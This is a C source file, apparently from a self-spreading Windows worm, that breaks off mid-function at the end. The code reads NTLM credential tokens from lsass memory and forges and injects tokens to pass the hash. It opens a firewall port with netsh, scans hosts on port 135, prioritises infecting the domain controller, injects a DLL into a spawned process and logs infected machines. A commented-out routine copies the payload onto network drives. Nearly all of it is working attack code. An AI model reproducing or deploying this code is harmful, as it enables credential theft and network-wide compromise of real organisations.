#include "main.h"
#include "globals.h"

void (WINAPI *LsaEncryptMemory6)(unsigned int *, unsigned int, unsigned int) = NULL;

// globals.h
BYTE				secret_glob[24] = {0};

/*  Spreads to Mounted NetBios Drives */
/*
__declspec(dllexport) BOOL i_lan(const PI_LAN_IN parm)
{
	HANDLE			hp_parm, file_handle;
	DWORD			*exe_image, *final_image;
	DWORD			exe_size, final_size;
	BYTE			drive_letter = 0x40;
	status		nt_status;
	unsigned int	i = 0;
	char			drive_path[128], autorun_string[1024] = {0};
	int				junk;

	exe_image	= parm->program;
	exe_size	= parm->size;
	hp_parm		= parm->parm;

	HeapFree(hp_parm, 0, parm);
	HeapDestroy(hp_parm);

	// Start enumerating drive letters
	for (i = 0; i < 26; i++) {

		// Prepare drive letter
		drive_letter++;
		ZeroMemory(drive_path, sizeof(drive_path));
		drive_path[0] = drive_letter;
		CopyMemory(drive_path + 1, ":\\", 2);

		// Attempt to access drive
		nt_status = GetDriveTypeA((LPCSTR)drive_path);
		switch (nt_status) {

		case DRIVE_UNKNOWN:
			continue;

		case DRIVE_NO_ROOT_DIR:
			continue;

		case DRIVE_REMOVABLE:
			continue;

		case DRIVE_FIXED:
			continue;

		case DRIVE_REMOTE:
			// Write the image to the disk disk
			sprintf(drive_path, "%s\%s", drive_path, OUTPUT_FILE);
			write_file_to_disk((unsigned char *)drive_path, final_image, final_size);
			continue;

		default:
			continue;
		}
	}
}*/

BOOL open_shadow_copy(VOID)
{
	HANDLE	shadow_device;

	shadow_device = CreateFileW(SHADOW_SYM_LINK, GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

	// FIXME - OBSOLETE



	return TRUE;
}

VOID debug_copy_lsass(VOID)
{
	MEMORY_BASIC_INFORMATION		memory_basic_information;
	HANDLE							lsass;
	DWORD							pid_array[MAX_PIDS] = {0};
	DWORD							*remote_ptr = NULL;
	DWORD							*local_pointer;
	int								junk;

	find_pid("lsass.exe", pid_array);

	lsass = OpenProcess(GENERIC_READ, NULL, pid_array[0]);

	while (TRUE) {
		ZeroMemory(&memory_basic_information, sizeof(MEMORY_BASIC_INFORMATION));
		if (VirtualQueryEx(lsass, remote_ptr, &memory_basic_information, sizeof(MEMORY_BASIC_INFORMATION)) == NULL) break;
		

		if (memory_basic_information.State == MEM_COMMIT) {
			local_pointer = (PDWORD)VirtualAlloc(memory_basic_information.BaseAddress, memory_basic_information.RegionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
			if (local_pointer == NULL) {
				remote_ptr = (PDWORD)((DWORD)remote_ptr + (DWORD)memory_basic_information.RegionSize); 
				if (remote_ptr == NULL) break;
				continue;
			}
			ReadProcessMemory(lsass, memory_basic_information.AllocationBase, local_pointer, memory_basic_information.RegionSize, (SIZE_T *)&junk);
		}

		remote_ptr = (PDWORD)((DWORD)remote_ptr + (DWORD)memory_basic_information.RegionSize);
		if (remote_ptr == NULL) break;
	}



	CloseHandle(lsass);
}


VOID lsass_procedure(VOID)
{
	PNTLM_TOKEN							ntlm_tokens[MAX_TOKENS];
	NTLM_TOKEN							real_token;
	PNTLM_TOKEN							ntlm_husk;

	SYSTEM_INFO							system_info									= {0};

	ERROR_CODE							status;

	SECURITY_ATTRIBUTES					security_attributes							= {0};

	PROCESS_INFORMATION					process_info								= {0};
	STARTUPINFOW						startup_info								= {0};

	HANDLE								event_husk_ready							= INVALID_HANDLE_VALUE;
	HANDLE								logon_user									= INVALID_HANDLE_VALUE;
	HANDLE								local_heap									= INVALID_HANDLE_VALUE;
	HANDLE								heap_tmp;

	BYTE								fake_ntlm_pass[NTLM_HASH_SIZE]				= NTLM_PASS;

	PDWORD								used_token_sums;
	DWORD								injected_tokens[64];
	PDWORD								ptr;
	
	BOOL								no_targets									= FALSE;
	BOOL								dc_priority;

	BYTE								token_payload[NTLM_TOKEN_6_SIZE];

	CHAR								output_string[40];
	CHAR								encrypted_token_buffer[NTLM_TOKEN_6_SIZE];

	INT									thread_count, threads[MAX_THREADS];
	INT									i;
	CHAR								b, d;

	struct in_addr						target_address_struct;
	struct	hostent						*host;
	
	LPCWSTR								dc						= NULL,
										domain					= NULL,
										server					= NULL;
	PCHAR								dc_a					= NULL;
	WCHAR								comp_name[128]			= {0};
	DWORD								comp_name_size			= sizeof(comp_name);
	WSADATA								wsadata					= {0};

	//BREAK;

#ifdef NICE_DEBUG
	DEBUG("HELIOS> nTM started.");
#endif

	// Determine architecture
	GetNativeSystemInfo(&system_info);
#ifdef DEBUG_OUT
	if (system_info.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64) {

		DEBUG("+lsass64> Running on 64-bit architecture");

		//Sleep(INFINITE);
	}
#endif

	// Allocate memory - FIXME 
	local_heap			= HeapCreate(0, 0, 0x1000);
	used_token_sums		= (PDWORD)VirtualAlloc(NULL, TOKEN_POOL_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	infected_machines	= (PDWORD)VirtualAlloc(NULL, TOKEN_POOL_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	
	// Setup event signal
	security_attributes.nLength					= sizeof(SECURITY_ATTRIBUTES);
	security_attributes.bInheritHandle			= TRUE;
	security_attributes.lpSecurityDescriptor	= NULL;
	event_husk_ready							= CreateEventA(&security_attributes, TRUE, FALSE, HUSK_READY_SIGNAL);

	// Create reg key
	create_registry_key(HUSK_KEY_HIVE, HUSK_SUBKEY, HUSK_NAME, HUSK_ERROR_FALSE);

#ifdef DEBUG_OUT
	DEBUG("+lsass> Resolving PDC Hostname....");
#endif

	// Determine IP addy of domain controller
	NetGetDCName(server, domain, (LPBYTE *)&dc);
	dc = (LPWSTR)((DWORD)dc + 4);

	if (((DWORD_PTR)((DWORD_PTR)dc - 4) == NULL) || (get_unicode_string_length(dc) == 0)) {
#ifdef DEBUG_OUT
		DEBUG("+lsass> Failed to obtain PDC hostname!");
		PANIC;
#endif
	}

	dc_a = unicode_to_ascii(dc, get_unicode_string_length(dc));

#ifdef DEBUG_OUT
	DEBUG("+lsass> PDC hostname: %s", dc_a);
#endif

	//BREAK;

	host = gethostbyname(dc_a);	
	if (host == NULL) {
#ifdef DEBUG_OUT
		DEBUG("+lsass> Failed to resolve PDC hostname");
		PANIC;
#endif
	}

	if (dc_address != 0xffffffff) {
		dc_address = *(PDWORD)((PDWORD)(*host->h_addr_list)); // FIXME - expect ipv6 & multiple virtual interfaces 
#ifdef DEBUG_OUT
		DEBUG("+lsass> Primary DC is at 0x%08x. Opening firewall and informing net scan thread...", dc_address);
#endif
	} else {
		dc_address = 0;
#ifdef DEBUG_OUT
		DEBUG("+lsass> We're running on a PDC. Opening firewall and informing net scan thread...", dc_address);
#endif
	}

	//BREAK;

	// Create tftpd firewall rule
	ZeroMemory((void *)&startup_info, sizeof(STARTUPINFO));
	ZeroMemory((void *)&process_info, sizeof(PROCESS_INFORMATION));
	CreateProcessW(	NULL, 
					L"C:\\windows\\system32\\netsh.exe firewall add portopening UDP 69 \"Windows CFYS Server\"",
					NULL,
					NULL,
					FALSE,
					CREATE_NO_WINDOW,
					NULL,
					NULL,
					&startup_info,
					&process_info);
	//Sleep(5000);

	// Inform scan_net()
	//SetEvent(dc_address_sync_object);

	// Scan the network
	dc_priority = TRUE;

spray_network:
	Sleep(1000);
	//ZeroMemory(ip_address_list, IP_ADDRESS_LIST_POOL);
	//scan_net();

	// Grab IP
	while (TRUE) {

		// Set the used token pool (we want to remove used husks also)
		ZeroMemory(used_token_sums, TOKEN_POOL_SIZE);
		set_memory((PBYTE)used_token_sums, 0x41, 32);

#ifdef DEBUG_OUT
		DEBUG("+lsass> Looking for new target...");
#endif

		// Test our target WMI access FIXME
		//if ((DWORD)*ip_address_list == 0) {
			// No infected machines yet. Attempt to target Global Catalog DC first.
		//} else {
			// We have infected machines already
		status = 0;
		while (status == 0) {

			// Do we have a domain controller override?
			if ((dc_address != 0) && (dc_priority == TRUE)) {

				// Test if the DC was infected already
				ptr = infected_machines;
				while (*ptr != 0) {

					if (*ptr == dc_address) {
						break;
					}

					ptr++;
				}

				// DC is prioritized
				if (*ptr == 0) {	

					// DC isn't in infected_machines
#ifdef DEBUG_OUT
					DEBUG("+lsass> Prioritizing active Domain Controller....");
#endif

#ifdef NICE_DEBUG
					DEBUG("HELIOS> Looking for Primary Domain Controller");
#endif

					//dc_priority = FALSE;

					target_address_struct.S_un.S_addr = dc_address;

					break;
				} 

#ifdef DEBUG_OUT
				else {

					DEBUG("+lsass> PDC Already infected");

				}
#endif
			}

			ZeroMemory(&target_address_struct, sizeof(struct in_addr));
			Sleep(500);
			target_address_struct.S_un.S_addr = get_random_address_from_pool(ip_address_list);

			if (target_address_struct.S_un.S_addr == 0) {
				Sleep(1000);
#ifdef DEBUG_OUT
				DEBUG("+lsass> out of targets, waiting...");
#endif
				dc_priority = TRUE;

				// Signal to zero the used_address_buffer
				zero_used_ip_list = TRUE;

				Sleep(1000);

				goto spray_network;
			}

			status = test_syn_port(135, target_address_struct.S_un.S_addr);
#ifdef DEBUG_OUT
			DEBUG("+lsass> Testing address 0x%08x status: 0x%08x", target_address_struct.S_un.S_addr, status);
#endif

			// Check if the target is already infected
			ptr = infected_machines;
			while (TRUE) {
				if (*ptr == 0) break;

				if (*ptr == target_address_struct.S_un.S_addr) {
					// Already infected
					status = 0;
					break;
				}
				ptr++;
			}
		}
		//}

#ifdef DEBUG_OUT
		DEBUG("+lsass> Using address 0x%08x", target_address_struct.S_un.S_addr);
#endif

		create_registry_key(TARGET_KEY_HIVE, TARGET_SUBKEY, TARGET_NAME, target_address_struct.S_un.S_addr);

		// Attack target
		while (TRUE) {
			//__nop;
			//BREAK;

			// Grab all existing tokens
			ZeroMemory((void *)ntlm_tokens, sizeof(PNTLM_TOKEN) * MAX_TOKENS);
#ifdef DEBUG_OUT
			DEBUG("+lsass> Enumerating tokens...");
#endif
			find_ntlm_tokens(ntlm_tokens, lsass_extract_hash_from_token, NTLM_TOKEN_6_SIZE);

#ifdef DEBUG_OUT
#ifdef DEBUG_PRINT_NUMBER_OF_TOKENS
			i = 0;
			while (ntlm_tokens[i] != NULL) {
				i++;
			}
			DEBUG("+lsass> Enumerated %d tokens.", i);
#endif
#endif
			// Remove token duplicates (checks matching ntlm/session hashes)
			// If this is a husk token, do not remove (check fake ntlm hash)
			//lsass5_remove_dup_tokens(ntlm_tokens); FIXME (obsolete)

			// Remove all used real and husk tokens
#ifdef DEBUG_OUT
			DEBUG("+lsass> Removing duplicates");
#endif
			lsass5_remove_used_tokens(used_token_sums, ntlm_tokens);

#ifdef DEBUG_OUT
#ifdef DEBUG_PRINT_NUMBER_OF_TOKENS
			i = 0;
			while (ntlm_tokens[i] != NULL) {
				i++;
			}
			DEBUG("+lsass> Filtered %d tokens", i);
#endif
#endif

			// Are we out of tokens?
			if (ntlm_tokens[0] == NULL) {

				// Switch dc_priority
				dc_priority = dc_priority ^ 1;

#ifdef DEBUG_OUT
				DEBUG("+lsass> Out of usable tokens. DC Prioritization is %d", dc_priority);
#endif 


				goto spray_network;
			}

			// Select a real token to impersonate, copy into real_token
			//BREAK;
			ZeroMemory((void *)&real_token, sizeof(NTLM_TOKEN));
			real_token.heap					= HeapCreate(0, 0, 0x100);
			real_token.decrypted_token		= (PDWORD)HeapAlloc(real_token.heap, 0, NTLM_TOKEN_6_SIZE);
			ZeroMemory(real_token.decrypted_token, NTLM_TOKEN_6_SIZE);
			CopyMemory(real_token.decrypted_token, ntlm_tokens[0]->decrypted_token, NTLM_TOKEN_6_SIZE);
			real_token.ntlm					= (PBYTE)((DWORD_PTR)real_token.decrypted_token + TOKEN_OFFSET_NTLM);
			real_token.session				= (PBYTE)((DWORD_PTR)real_token.decrypted_token + TOKEN_OFFSET_SESSION);
			real_token.domain				= (wchar_t *)((DWORD_PTR)real_token.decrypted_token + TOKEN_OFFSET_DOMAIN);
			real_token.user					= (wchar_t *)(*(PDWORD)((DWORD_PTR)real_token.decrypted_token + TOKEN_OFFSET_USER) + (DWORD)real_token.decrypted_token);
			real_token.raw_token			= ntlm_tokens[0]->raw_token;
			real_token.primary_string		= ntlm_tokens[0]->primary_string;



			// Print out target token info
			{
#ifdef DEBUG_OUT
				DEBUG("+lsass> IMPERSONATING:");
				DEBUGw((wchar_t *)real_token.user);
				DEBUGw((wchar_t *)real_token.domain);

				// NTLM
				ZeroMemory(output_string, sizeof(output_string));
				for (i = 0; i < NTLM_HASH_SIZE; i++) {
					get_byte_hex(real_token.ntlm[i], &b, &d);

					output_string[i * 2] = b;
					output_string[i * 2 + 1] = d;
				}
				DEBUG(output_string);

				// Session
				ZeroMemory(output_string, sizeof(output_string));
				for (i = 0; i < NTLM_HASH_SIZE; i++) {
					get_byte_hex(real_token.session[i], &b, &d);

					output_string[i * 2] = b;
					output_string[i * 2 + 1] = d;
				}
				DEBUG(output_string);
#endif
			}

			// Cleanup tokens
			i = 0;
			while (ntlm_tokens[i] != NULL) { 
				HeapFree(ntlm_tokens[i]->heap, 0, ntlm_tokens[i]->decrypted_token);
				heap_tmp = ntlm_tokens[i]->heap;
				HeapFree(ntlm_tokens[i]->heap, 0, ntlm_tokens[i]);
				HeapDestroy(heap_tmp);

				ntlm_tokens[i] = NULL;
				i++;
			}

			// Create process
			//DEBUGw(husk_startup_string);
			ZeroMemory((PVOID)&startup_info, sizeof(STARTUPINFO));
			ZeroMemory((PVOID)&process_info, sizeof(PROCESS_INFORMATION));
			if (!CreateProcessWithLogonW(	real_token.user,
											real_token.domain,
											PLAINTEXT_PASS,
											LOGON_NETCREDENTIALS_ONLY,
											NULL,
											HUSK_PROCESS,
											CREATE_SUSPENDED,
											NULL,
											NULL,
											&startup_info,
											&process_info)) {

#ifdef DEBUG_OUT
				DEBUG("!lsass> Failed to start husk process\n");
#endif

				continue;
				// FIXME
			}

#ifdef DEBUG_OUT
			DEBUG("+lsass> Husk started (suspended)");
#endif

			// Grab all existing tokens
			ZeroMemory((PVOID)ntlm_tokens, sizeof(PNTLM_TOKEN) * MAX_TOKENS);
			find_ntlm_tokens(ntlm_tokens, lsass_extract_hash_from_token, NTLM_TOKEN_6_SIZE);

			// Remove token duplicates (checks matching ntlm/session hashes)
			// If this is a husk token, do not remove (check fake ntlm hash)
			//lsass5_remove_dup_tokens(ntlm_tokens);

			// Remove all used real and husk tokens
			lsass5_remove_used_tokens(used_token_sums, ntlm_tokens);

			// Find husk token
			i = 0;
			while (ntlm_tokens[i] != NULL) {
				if (!memory_compare((PDWORD)ntlm_tokens[i]->ntlm, (PDWORD)fake_ntlm_pass, sizeof(fake_ntlm_pass))) {
					break;
				}
				i++;
			}
			if (ntlm_tokens[i] == NULL) {
#ifdef DEBUG_OUT
				DEBUG("+lsass> Failed to find husk token");
#endif
				TerminateProcess(process_info.hProcess, 0);
				continue;
			}
			ntlm_husk = ntlm_tokens[i];

			// Inject into all husk tokens
#ifdef DEBUG_OUT
			DEBUG("+lsass> Located husk token, injecting token");
#endif
			{

				// Zero out token
				ZeroMemory(token_payload, sizeof(token_payload));

				// Copy over existing husk token
				CopyMemory(token_payload, ntlm_husk->decrypted_token, NTLM_TOKEN_6_SIZE);

				// Inject hashes
				CopyMemory((PVOID)((DWORD_PTR)token_payload + TOKEN_OFFSET_NTLM), real_token.ntlm, NTLM_HASH_SIZE);
				CopyMemory((PVOID)((DWORD_PTR)token_payload + TOKEN_OFFSET_SESSION), real_token.session, NTLM_HASH_SIZE);

				// Encrypt token
				status = lsass_encrypt_token(encrypted_token_buffer, token_payload);
				if (!status) {
#ifdef DEBUG_OUT
					DEBUG("+lsass> Error in token encryption");
#endif
					TerminateProcess(process_info.hProcess, 0);

					continue;
				}

				// Stop all lsass threads
				thread_count = 0;
				thread_control(TRUE, threads, (PINT)&thread_count);

				// Inject token
				CopyMemory(ntlm_husk->raw_token, encrypted_token_buffer, NTLM_TOKEN_6_SIZE);

				// Free pool
				//HeapFree(GetProcessHeap(), 0, encrypted_token_buffer);

				// Resume all threads
				thread_control(FALSE, threads, (PINT)&thread_count);
			}

			// Resume husk process
			ResumeThread(process_info.hThread);
			//Sleep(INFINITE);
#ifdef DEBUG_OUT
			DEBUG("+lsass> Husk resumed. Injecting code...");
#endif

			// Inject DLL into husk
			status = propagate_dll(process_info.dwProcessId, "cmd.exe", "husk_entry_point");
			if (!status) {
#ifdef DEBUG_OUT
				DEBUG("+lsass> Failure in DLL injection!");
#endif

				TerminateProcess(process_info.hProcess, 0);

				continue;
			}
#ifdef DEBUG_OUT
			DEBUG("+lsass> Injected DLL into husk");
#endif

#ifdef NICE_DEBUG

			ZeroMemory(output_string, sizeof(output_string));
			for (i = 0; i < NTLM_HASH_SIZE; i++) {
				get_byte_hex(real_token.session[i], &b, &d);

				output_string[i * 2] = b;
				output_string[i * 2 + 1] = d;
			}

			DEBUG("HELIOS> Trying token %s", output_string);
#endif
			
			//Sleep(INFINITE);

			Sleep(2000); //FIXME - gets stuck on "online" event

			// Signal GO & wait for husk to complete
			SetEvent(event_husk_ready);
			Sleep(500);
			WaitForSingleObject(event_husk_ready, INFINITE);
			ResetEvent(event_husk_ready);
			//SuspendThread(process_info.hThread);

#ifdef DEBUG_OUT
			DEBUG("+lsass> Husk completed operations");
#endif

			if (read_registry_key(HUSK_KEY_HIVE, HUSK_SUBKEY, HUSK_NAME) == HUSK_ERROR_FALSE) {

				// Husk token SUCCESS
				while (TRUE) {

					if (read_registry_key(HUSK_KEY_HIVE, HUSK_SUBKEY, HUSK_NAME) != HUSK_ERROR_FALSE) {
#ifdef DEBUG_OUT
						DEBUG("!lsass> Husk reported FAILURE!\n");
#endif

						break;
					}
#ifdef DEBUG_OUT
					DEBUG("+lsass> Husk reported SUCCESS!\n");
#endif

					Sleep(5000);

					// Set machine as infected
					ptr = infected_machines;
					while (*ptr != 0) {
						ptr++;
					}
					*ptr = target_address_struct.S_un.S_addr;

					// The hash was successful, so try to infect the domain controller again
					if (dc_address != 0) {

						// Test to see if the DC was infected
						ptr = infected_machines;
						while (*ptr != 0) {
							
							if (*ptr == dc_address) {
								// So the DC is infected, find a new target
								break;
							}

							ptr++;

						}
					}

					// Prioritize the DC
					if ((*ptr == 0) && (dc_address != 0)) {
#ifdef	DEBUG_OUT
						DEBUG("+lsass> Prioritizing functional hash on PDC");
#endif

						create_registry_key(TARGET_KEY_HIVE, TARGET_SUBKEY, TARGET_NAME, dc_address);

						SetEvent(event_husk_ready);
						Sleep(500);
						WaitForSingleObject(event_husk_ready, INFINITE);
						ResetEvent(event_husk_ready);

						if (read_registry_key(HUSK_KEY_HIVE, HUSK_SUBKEY, HUSK_NAME) != HUSK_ERROR_FALSE) {
							// Failure to attack DC

#ifdef DEBUG_OUT
							DEBUG("!lsass> Husk reported FAILURE (DC)!");
#endif

							dc_priority = FALSE;

							//continue;
						} else { 

							// Successful attack on DC

#ifdef DEBUG_OUT
							DEBUG("+lsass> Husk reported SUCCESS (DC)!");
#endif					
						
							// Set DC as infected
							ptr = infected_machines;
							while (*ptr != 0) {
								ptr++;
							}
							*ptr		= dc_address;
							dc_address	= 0;
							dc_priority = FALSE;
						}

						// The hash worked on teh DC, so proceed to spraying the network
					}


					// Find new target
					status = 0;
					while (status == 0) {
						ZeroMemory(&target_address_struct, sizeof(struct in_addr));
						target_address_struct.S_un.S_addr = get_random_address_from_pool(ip_address_list);

						if (target_address_struct.S_un.S_addr == 0) {
							Sleep(500);
#ifdef DEBUG_OUT
							DEBUG("+lsass> out of targets (reuse hash), getting more targets...");
#endif

							// Signal to zero the used_address_buffer
							zero_used_ip_list = TRUE;
							Sleep(5000);

							// Attempt to get a new address
							ZeroMemory(&target_address_struct, sizeof(struct in_addr));
							target_address_struct.S_un.S_addr = get_random_address_from_pool(ip_address_list);

							// Test if we have an address
							if (target_address_struct.S_un.S_addr == 0) {

								// No address found, get out of the loop
								no_targets = TRUE;
								goto term_proc;
							}
						}

						status = test_syn_port(135, target_address_struct.S_un.S_addr);

						// Check if the target is already infected
						ptr = infected_machines;
						while (TRUE) {
							if (*ptr == 0) break;

							if (*ptr == target_address_struct.S_un.S_addr) {
								// Already infected
								status = 0;
								break;
							}
							ptr++;
						}
					}

#ifdef DEBUG_OUT
					DEBUG("+lsass> Using address 0x%08x (reuse)", target_address_struct.S_un.S_addr);
#endif

					create_registry_key(TARGET_KEY_HIVE, TARGET_SUBKEY, TARGET_NAME, target_address_struct.S_un.S_addr);

					SetEvent(event_husk_ready);
					Sleep(500);
					WaitForSingleObject(event_husk_ready, INFINITE);
					ResetEvent(event_husk_ready);
				}

			} else {
				// Husk token FAILURE
				Sleep(1000); 
#ifdef DEBUG_OUT
				DEBUG("!lsass> Husk reported FAILURE!");
#endif
			}

term_proc:
			// Kill the husk process
			TerminateProcess(process_info.hProcess, 0);

			// Inject placeholder into used husk tokens
			{
				// Zero out token
				ZeroMemory(token_payload, NTLM_TOKEN_6_SIZE);

				// Copy over existing husk token
				CopyMemory(token_payload, ntlm_husk->decrypted_token, NTLM_TOKEN_6_SIZE);

				// Inject 0x41
#ifndef _WIN64
				set_memory((PBYTE)((DWORD_PTR)token_payload + TOKEN_OFFSET_SESSION), 0x41, NTLM_HASH_SIZE);
				set_memory((PBYTE)((DWORD_PTR)token_payload + TOKEN_OFFSET_NTLM), 0x41, NTLM_HASH_SIZE);
#else
				set_memory((PBYTE)((DWORD_PTR)token_payload + TOKEN_OFFSET_SESSION), 0x41, NTLM_HASH_SIZE);
				set_memory((PBYTE)((DWORD_PTR)token_payload + TOKEN_OFFSET_NTLM), 0x41, NTLM_HASH_SIZE);
#endif

				// Encrypt token
				lsass_encrypt_token(encrypted_token_buffer, token_payload);

				// Stop all lsass threads
				thread_count = 0;
				thread_control(TRUE, threads, (PINT)&thread_count);

				// Inject token
				CopyMemory(ntlm_husk->raw_token, encrypted_token_buffer, NTLM_TOKEN_6_SIZE);

				// CLeanup
				//HeapFree(GetProcessHeap(), 0, encrypted_token_buffer); FIXME - CRITICAL MEMORY LEAK

				// Resume all threads
				thread_control(FALSE, threads, (PINT)&thread_count);
			}

			// Set real_token as used
			ptr = used_token_sums;
			while ((*ptr != 0) && (*(PDWORD)((DWORD_PTR)ptr + NTLM_HASH_SIZE) != 0)) {
				ptr = (PDWORD)((DWORD_PTR)ptr + 32);
			}
			CopyMemory(ptr, (PVOID)real_token.session, NTLM_HASH_SIZE);
			CopyMemory((PVOID)((DWORD_PTR)ptr + NTLM_HASH_SIZE), (PVOID)real_token.ntlm, NTLM_HASH_SIZE);
			//CopyMemory(ptr, (PVOID)real_token.session, 32);


			//dc_priority = TRUE;

			// Free real_token
			HeapFree(real_token.heap, 0, real_token.decrypted_token);
			HeapDestroy(real_token.heap);
			
			// Cleanup tokens
			i = 0;
			while (ntlm_tokens[i] != NULL) { 
				HeapFree(ntlm_tokens[i]->heap, 0, ntlm_tokens[i]->decrypted_token);
				heap_tmp = ntlm_tokens[i]->heap;
				HeapFree(ntlm_tokens[i]->heap, 0, ntlm_tokens[i]);
				HeapDestroy(heap_tmp);

				ntlm_tokens[i] = NULL;
				i++;
			}

			if (no_targets == TRUE) {
				no_targets = FALSE; 
				
				goto spray_network;
			}
		}
	}
}

BOOL lsass_encrypt_token(CHAR out_buffer[NTLM_TOKEN_6_SIZE], PBYTE buffer) 
{
	BYTE							secret[24]				= {0};

	ERROR_CODE						status;
	BCRYPT_ALG_HANDLE				algorithm_handle		= NULL;
	BCRYPT_KEY_HANDLE				key_handle;
	DWORD							key_object				= 0;
	DWORD							property_result			= 0;
	DWORD							version, version_major, version_minor;
	PUCHAR							sym_key_data			= NULL;
	BYTE							iv[8]					= {0};
	int								junk;

	BYTE							output[NTLM_TOKEN_6_SIZE] = {0};
	
	// Determine if we are running in NT6.0
	version			= GetVersion();
	version_major	= (DWORD)(LOBYTE(LOWORD(version)));
	version_minor	= (DWORD)(HIBYTE(LOWORD(version)));
	if ((version_major == 6) && (version_minor == 0)) {
		// TRUE

		// Check
		if (LsaEncryptMemory6 == NULL) {
			BREAK;
		}

		CopyMemory(out_buffer, buffer, NTLM_TOKEN_6_SIZE);

		LsaEncryptMemory6((unsigned int *)out_buffer, NTLM_TOKEN_6_SIZE, 1);

		return TRUE;
	}

	ZeroMemory(output, NTLM_TOKEN_6_SIZE);

	// Grab the secret key
	lsass_get_secret(secret);
	if (*secret == (DWORD)0) {

		// We're probably using an unsupported OS... FIXME ?
		return FALSE;
	}

	// Begin the encryption mechanism
	status = BCryptOpenAlgorithmProvider(&algorithm_handle, BCRYPT_3DES_ALGORITHM, NULL, 0);
	if (status != STATUS_SUCCESS) {
#ifdef DEBUG_OUT
		DEBUG("!lsass> BCryptOpenAlgorithmProvider failed 0x%08x", status);
#endif
		return FALSE;
	}

	// Set property on algorithm
	status = BCryptSetProperty(algorithm_handle, BCRYPT_CHAINING_MODE, (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
	if (status != STATUS_SUCCESS) {
#ifdef DEBUG_OUT
		DEBUG("!lsass> BCryptSetProperty failed 0x%08x", status);
#endif
		return FALSE;
	}

	// Get property
	status = BCryptGetProperty(	algorithm_handle, 
									BCRYPT_OBJECT_LENGTH, 
									(PBYTE)&key_object, 
									sizeof(DWORD), 
									&property_result, 
									0);
	if (status != STATUS_SUCCESS) {
#ifdef DEBUG_OUT
		DEBUG("!lsass> BCryptGetProperty failed 0x%08x", status);
#endif
		return FALSE;
	}

	// Allocate memory for sym key
	sym_key_data = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, (DWORD)key_object);
	ZeroMemory(sym_key_data, key_object);

	// Generate key
	status = BCryptGenerateSymmetricKey(	algorithm_handle, 
											&key_handle,
											sym_key_data,
											key_object,
											secret,
											sizeof(secret),
											0);									
									
	if (status != STATUS_SUCCESS) {	
#ifdef DEBUG_OUT
		DEBUG("!lsass> Generating symmetric key failed 0x%08x", status);
#endif
		return FALSE;
	}

	//ntlm_token->raw_token = (PDWORD)HeapAlloc(ntlm_token->heap, 0, 0x80);

	/*
	// Get size of output buffer
	status = BCryptDecrypt(	key_handle,
								(PUCHAR)local_token->raw_token,
								0x80,
								NULL,
								iv,
								sizeof(iv),
								(PUCHAR)local_token->decrypted_token,
								0x80,
								(PULONG)&junk,
								0);		
	*/

	status = BCryptEncrypt(	key_handle,
								(PUCHAR)buffer,
								NTLM_TOKEN_6_SIZE,
								NULL,
								iv,
								sizeof(iv),
								(PUCHAR)output,
								NTLM_TOKEN_6_SIZE,
								(PULONG)&junk,
								0);


	if (status != STATUS_SUCCESS) {
#ifdef DEBUG_OUT
		DEBUG("!lsass> Encryption Failed 0x%08x", status);
#endif
		return FALSE;
	} else {
		//DEBUG(">>> [lsass] <<< token crafted and ready for injection 0x%08x", output);
		CopyMemory(out_buffer, output, NTLM_TOKEN_6_SIZE);

		return TRUE;
	}


}

#pragma optimize('t', on)
VOID find_ntlm_tokens(	PNTLM_TOKEN token_structure[MAX_TOKENS],
						BOOL (*decrypter)(PNTLM_TOKEN *, PCHAR),
						UINT token_size)
{
	MEMORY_BASIC_INFORMATIONX		mem_info;
	ERROR_CODE						status;
	PNTLM_TOKEN						ntlm_token;
	UCHAR							token_string[]					= { 'P', 'r', 'i', 'm', 'a', 'r', 'y', '\0' };
	PDWORD							page							= 0;
	PBYTE							ptr;
	UINT							token_structure_counter			= 0;

	while (TRUE) {

		ZeroMemory((PVOID)&mem_info, sizeof(MEMORY_BASIC_INFORMATIONX));
		status = (ERROR_CODE)VirtualQuery(page, &mem_info, sizeof(MEMORY_BASIC_INFORMATIONX));
		if (!status) {
			break;
		}

		if ((!mem_info.State == MEM_COMMIT) || (mem_info.Type != MEM_PRIVATE)) {
			goto next_page;
		}

		// Check if we have access to the page
		if (IsBadReadPtr(mem_info.BaseAddress, 4)) {
			goto next_page;
		}

		// Iterate through page
		//DEBUG("0x%08x", page);
		//BREAK;
		ptr = (PBYTE)mem_info.BaseAddress;
		while (((DWORD_PTR)ptr - (DWORD_PTR)page) != ((DWORD_PTR)mem_info.RegionSize - (token_size + 1))) {

			// Check for the signature
			if ((*(PDWORD)ptr != 'mirP') && (*(PDWORD)((DWORD_PTR)ptr + 4) != '\0yra')) {
				ptr++;
				continue;
			}

			// Check if ptr is within range
			if ((DWORD_PTR)((DWORD_PTR)ptr - PRIMARY_STRING_DELTA) < (DWORD_PTR)page) {
				ptr++;
				continue;
			}

			// Check if the reference pointer exists
			if (*(PDWORD)((DWORD_PTR)ptr - PRIMARY_STRING_DELTA) != (DWORD_PTR)ptr) {
				ptr++;
				continue;
			}

			status = decrypter(&token_structure[token_structure_counter], (PCHAR)ptr);
			if (!status) {
#ifdef DEBUG_OUT
				//DEBUG("+lsass> Invalid NULL token");
#endif
			} else {
				token_structure_counter++;
			}
			ptr++;
		}

next_page:
		if (	(((DWORD_PTR)page + mem_info.RegionSize) > MAX_DLL_BASE) || 
				(((DWORD_PTR)page + mem_info.RegionSize) < (DWORD_PTR)page)) {
			break;
		}
		page = (PDWORD)((DWORD_PTR)mem_info.BaseAddress + mem_info.RegionSize);
	}

	return;


	//BREAK;

	/*
	while ((DWORD_PTR)page < MAX_DLL_BASE) { // fIXME
		ZeroMemory((void *)&memory_basic_information, sizeof(MEMORY_BASIC_INFORMATIONX));
		if (!VirtualQuery(page, &memory_basic_information, sizeof(MEMORY_BASIC_INFORMATIONX))) {
			break;
		}

		if ((!memory_basic_information.State == MEM_COMMIT) || (memory_basic_information.Type != MEM_PRIVATE)) {
			page = (PBYTE)((DWORD_PTR)page + 0x1000);
			continue;
		}

		ptr = page;
		while (!IsBadReadPtr(ptr, sizeof(token_string))) {

